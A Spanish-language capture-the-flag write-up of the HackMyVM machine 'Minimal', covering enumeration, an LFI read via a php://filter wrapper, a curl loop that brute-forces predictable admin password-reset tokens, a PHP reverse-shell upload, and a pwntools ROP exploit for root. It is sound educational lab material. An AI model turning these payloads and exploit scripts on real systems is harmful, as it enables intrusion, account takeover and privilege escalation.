---
layout: post
title: Minimal - Hackmyvm
tags: [ctf, hackmyvm, by-me]
---

**Autor**: 0xH3rshel \\
**Dificultad**: Medio

![img](/imgs/write-ups/by-me/minimal/minimal.png)

## Reconocimiento

Como es costumbre, comienzo con una enumeración de los puertos abiertos. En esta máquina solo están el 22 (ssh) y el 80 (apache http) disponibles.
```
h3rshel@kali:~/Desktop$ sudo nmap -p- 192.168.1.125
Nmap scan report for 192.168.1.125
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
[...]
```

### 80 http

Navego a la página principal y me encuentro con una tienda de ropa. A primera vista se puede ver únicamente un botón para iniciar sesión y que es necesario tener cuenta para poder comprar ropa.

![img](/imgs/write-ups/by-me/minimal/minimal_1.png)

### Gobuster

Utilizo **gobuster** para realizar una enumeración de ficheros y subdirectorios.

```
h3rshel@kali:~/Desktop$ gobuster dir -u "http://192.168.1.125/" -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x html,php,txt
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 6297]
/login.php            (Status: 200) [Size: 1019]
/register.php         (Status: 200) [Size: 1097]
/admin.php            (Status: 302) [Size: 0] [--> login.php]
/buy.php              (Status: 200) [Size: 892]
/imgs                 (Status: 301) [Size: 313] [--> http://192.168.1.125/imgs/]
/logout.php           (Status: 302) [Size: 0] [--> /index.php]
/config.php           (Status: 200) [Size: 0]
/styles               (Status: 301) [Size: 315] [--> http://192.168.1.125/styles/]
/robots.txt           (Status: 200) [Size: 12]
/restricted.php       (Status: 302) [Size: 0] [--> ../index.php]
/shop_cart.php        (Status: 302) [Size: 0] [--> ../index.php]
[...]
```

Tras la enumeración, hago click en iniciar sesión y como no tengo cuenta **creo un usuario nuevo**.

Una vez iniciada sesión realizo un pedido y se puede ver en la **url** que el parámetro "action" es vulnerable a **LFI** tal y como se puede ver en las siguientes imágenes.

![img](/imgs/write-ups/by-me/minimal/minimal_2.png)


![img](/imgs/write-ups/by-me/minimal/minimal_2_1.png)

Con esta vulnerabilidad y un **php wrapper**, puedo leer el resto de archivos de la siguiente manera.

```
http://192.168.1.125/shop_cart.php?action=php://filter/read=convert.base64-encode/resource=admin
```

Utilizo **Cyberchef** para pasar de base64 a php de nuevo.

A continuación muestro el código más importante:

### Admin
```php
<?php
[...]
if ($_SESSION['username'] !== 'admin') {
    header('Location: login.php');
    exit;
}
[...]
?>
<!DOCTYPE html>
[...]
   <h1>Admin Panel</h1>
    <div class="container">
        <h1>Add new Product</h1>
        <form action="admin.php" method="post" enctype="multipart/form-data">
            <label for="nombre">Name:</label>
            <input type="text" name="nombre" id="nombre" required>

            <label for="autor">Author:</label>
            <input type="text" name="autor" id="autor" required>

            <label for="precio">Price:</label>
            <input type="number" name="precio" id="precio" required>

            <label for="descripcion">Description:</label>
            <textarea name="descripcion" id="descripcion" required></textarea>

            <label for="imagen">Img:</label>
            <input type="file" name="imagen" id="imagen" accept="image/*" required>

            <input type="submit" value="Upload">
        </form>
    </div>
</body>
</html>
```

De este archivo solo hay que destacar 2 cosas importantes:
1. La única comprobación para acceder a "/admin.php" es que el nombre del usuario sea admin.
2. Nos permite subir archivos mediante un formulario (Útil para subir una reverse shell).

### Reset Pass

```php
<?php
require_once "./config.php";

$error = false;
$done = false;
$change_pass = false;

session_start();

$username = null;

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['username'];

    $query = $conn->prepare("SELECT * FROM users WHERE user = ?");
    $query->bind_param("s", $username);

    $query->execute();
    $result = $query->get_result();

    if ($result->num_rows == 1) {
        while ($row = $result->fetch_assoc()) {
            $name = $row['user'];
            $randomNumber = rand(1, 100);
            $nameWithNumber = $name . $randomNumber;
            $md5Hash = md5($nameWithNumber);
            $base64Encoded = base64_encode($md5Hash);

            $deleteQuery = $conn->prepare("DELETE FROM pass_reset WHERE user = ?");
            $deleteQuery->bind_param("s", $name);
            $deleteQuery->execute();

            $insertQuery = $conn->prepare("INSERT INTO pass_reset (user, token) VALUES (?, ?)");
            $insertQuery->bind_param("ss", $name, $base64Encoded);

            if ($insertQuery->execute()) {
                $error = false;
                $done = true;
            } else {
                $error = true;
            }
        }
    } else {
        $error = true;
    }
}

if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    if (isset($_GET['user']) and isset($_GET['token']) and isset($_GET['newpass'])) {
        $user = $_GET['user'];
        $token = $_GET['token'];
        $newpass = $_GET['newpass'];

        // Paso 1: Verificar si el usuario y token coinciden en la tabla pass_reset
        $query = $conn->prepare("SELECT token FROM pass_reset WHERE user = ?");
        $query->bind_param("s", $user);
        $query->execute();
        $result = $query->get_result();

        if ($result->num_rows > 0) {
            $row = $result->fetch_assoc();
            $storedToken = $row['token'];

            if ($storedToken === $token) {
                // Paso 2: Actualizar la contraseÃ±a en la tabla users
                $updateQuery = $conn->prepare("UPDATE users SET pass = ? WHERE user = ?");
                $hashedPassword = password_hash($newpass, PASSWORD_DEFAULT);
                $updateQuery->bind_param("ss", $hashedPassword, $user);

                if ($updateQuery->execute()) {
                    echo "Password updated";
                } else {
                    echo "Error updating";
                }
            } else {
                echo "Not valid token";
            }
        } else {
            echo "Error http 418 ;) ";
        }
    }
}
?>
```

Este fichero tiene 2 partes fundamentales:

### POST

Estos son  los pasos que sigue el servidor para generar un token y que un usuario pueda recuperar una contraseña.
- Obtiene el nombre de usuario.
- Genera un número aleatorio entre 1 y 100.
- Concatena el nombre de usuario con el número aleatorio.
- Calcula el hash MD5 de la cadena resultante.
- Codifica en base64 el hash MD5.
- Prepara y ejecuta una consulta SQL para eliminar cualquier token existente en la tabla "pass_reset" para el mismo usuario.
- Inserta un nuevo registro en la tabla "pass_reset" con el nombre de usuario y el token generado.

Entonces el token se genera de la siguiente manera ``base64(md5([nombre_usuario]+[número aleatorio 1-100]))``

### GET

Tras generar el token y hacer una solicitud GET se comprueba que el token es el correcto de la siguiente forma.
- Verifica si los parámetros 'user', 'token' y 'newpass' están presentes en la URL.
- Si los parámetros están presentes, obtiene sus valores y realiza las siguientes operaciones:
  - Prepara y ejecuta una consulta SQL para seleccionar el token almacenado en la tabla "pass_reset" para el usuario proporcionado.
  - Verifica si el token almacenado coincide con el token proporcionado en la URL.
  - Si los tokens coinciden, prepara y ejecuta una consulta SQL para actualizar la contraseña en la tabla "users" con la nueva contraseña proporcionada.
  - Muestra "Password updated" si la actualización tiene éxito, o "Error updating" si hay un problema.
  - Si los tokens no coinciden, muestra "Not valid token".

La vulnerabilidad en este caso es que podemos hacer una lista finita de los posibles tokens y con ellos cambiar la contraseña del usuario **admin** para poder acceder a "/admin.php".

Lo primero que hay que hacer es solicitar el cambio de contraseña de **admin**.

![img](/imgs/write-ups/by-me/minimal/minimal_3.png)

## Explotación

Y a continuación, utilizando el siguiente script, hacer un ataque de fuerza bruta.
```sh
name="admin"

for ((i=1; i<=100; i++)); do
    nameWithNumber="${name}${i}"
    md5Hash=$(echo -n "$nameWithNumber" | md5sum | awk '{print $1}')
    base64Encoded=$(echo -n "$md5Hash" | base64)
    curl -X GET "http://192.168.1.125/reset_pass.php?user=admin&token=$base64Encoded&newpass=patata"
done
```

Tras ejecutar el script, podremos iniciar sesión como **admin** debido con la contraseña que hayamos elegido y acceder a "/admin.php".

### admin.php

![img](/imgs/write-ups/by-me/minimal/minimal_4.png)

Ahora lo único que hay que hacer es subir una **reverse shell** en php que pueda ejecutar el servidor.

## Escalado de privilegios

Obtengo conexión como el usuario **www-data**.

```
h3rshel@kali:~/Desktop/tools$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [192.168.1.118] from (UNKNOWN) [192.168.1.125] 40044
Linux minimal 5.15.0-88-generic #98-Ubuntu SMP Mon Oct 2 15:18:56 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
 20:52:45 up 45 min,  0 users,  load average: 0.02, 0.08, 0.08
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ script -qc /bin/bash /dev/null
www-data@minimal:/$ sudo -l
sudo -l
Matching Defaults entries for www-data on minimal:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User www-data may run the following commands on minimal:
    (root) NOPASSWD: /opt/quiz/shop
```

Rápidamente se puede ver que puedo ejecutar **/opt/quiz/shop** como usuario root.

### Ejecución de prueba

Ejecuto el binario... prometo que está libre de virus ;)

```
www-data@minimal:/opt/quiz$ sudo ./shop
Hey guys, I have prepared this little program to find out how much you know about me, since I have been your administrator for 2 years.
If you get all the questions right, you win a teddy bear and if you don't, you win a teddy bear and if you don't, you win trash
What is my favorite OS?
test
Nope!!
What is my favorite food?
test
Nope!!
What is my favorite text editor?
test
Nope!!
User name: test
Saving results .
www-data@minimal:/opt/quiz$ cat results.txt
cat results.txt
User: 0xH3rshel
Points: 3

User: test
Points: 0
```

Parece un simple cuestionario con varias preguntas.

### Shop

Me descargo el binario en mi máquina **kali** y lo analizo en busca de alguna forma de explotarlo.

#### Checksec
```
h3rshel@kali:~/Desktop/reversing$ pwn checksec shop      
[*] '/home/h3rshel/Desktop/reversing/shop'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

#### Funciones
```
[0x0040168f]> afl
0x00401274   10 301          sym.secret_q2
0x0040147e    7 198          sym.question_2
0x004015d5    1 10           sym.wait_what
0x0040168f    5 193          main
0x004015e2    4 173          sym.writeResults
0x004013a1    4 100          sym.secret_q3
0x00401405    4 121          sym.question_1
0x00401544    4 145          sym.question_3
0x00401236    3 62           sym.print_prize
0x00401100    1 11           sym.imp.printf
[...]
```

Entre las funciones principales del binario están **main**, **print_prize** y las preguntas **question_{1..3}**.

#### Resumen Main

En el siguiente resumen de la función **main** podemos ver que no hay nada excesivamente interesante.

![img](/imgs/write-ups/by-me/minimal/minimal_5.png)

#### Question 1

Sin embargo en la pregunta 1 la cosa cambia.

![img](/imgs/write-ups/by-me/minimal/minimal_6.png)

Se puede ver que puede producir un **bufferoverflow** debido a que el tamaño asignado para la entrada es menor al tamaño que **fgets()** va a tomar. El objetivo aquí será contruir un **ROP** y obtener una shell como **root**.

#### Print Prize

![img](/imgs/write-ups/by-me/minimal/minimal_7.png)

Además aquí hay una llamada a **system()**, esto va a ser muy útil para ejecutar comandos. Hay que destacar que el comando a ejecutar lo toma a través del registro **rdi**.

#### Gadgets

El primer gadget consiste en una instrucción **pop rdi; ret**, la cual nos permitirá cambiar el valor del registro **rdi**.

![img](/imgs/write-ups/by-me/minimal/minimal_8.png)

Ahora necesito un comando que ejecutar... Casualmente dentro del binario podemos encontrar la cadena **sh\x00** con la cual obtendremos una shell.

![img](/imgs/write-ups/by-me/minimal/minimal_9.png)

#### Padding

Ahora solo queda calcular el padding entre la primera entrada del binario y la dirección de retorno a sobreescribir.

![img](/imgs/write-ups/by-me/minimal/minimal_10.png)

En este caso, la diferencia es de **0x78** bytes.

### Exploit

Con toda esta información recopilada podemos hacer un script en python que explote esta vulnerabilidad y obtener una shell como root.

```py
from pwn import *

# Conectarse al proceso en remoto
target = remote('192.168.1.125', 8000)

# Gadgets y direcciones importantes
system_addr = p64(0x0040124f) # Dirección de la llamada a system()
sh_address = p64(0x004021f5) # Dirección de la cadena de caracteres "sh"
pop_rdi= p64(0x004015dd) # Dirección de la instrucción pop rdi

# Creación del payload
payload = b"A" * 0x78 # Padding
payload += pop_rdi
payload += sh_address
payload += system_addr

target.sendline(payload)
target.interactive()
```

Debido a que la libreria **pwntools** se encuentra en mi máquina Kali y no en minimal, la solución más rápida que he encontrado es utilizar un listener con **nc** para envíar el payload.

![img](/imgs/write-ups/by-me/minimal/minimal_11.png)

Y con esto ya tendría acceso como usuario **root**

## Extra

Por despiste mio, también es posible leer el contenido de "/root/root.txt" utilizando **soft links** pero ese desarrollo ya se lo dejo al lector ;)

Espero que os haya gustado. :)
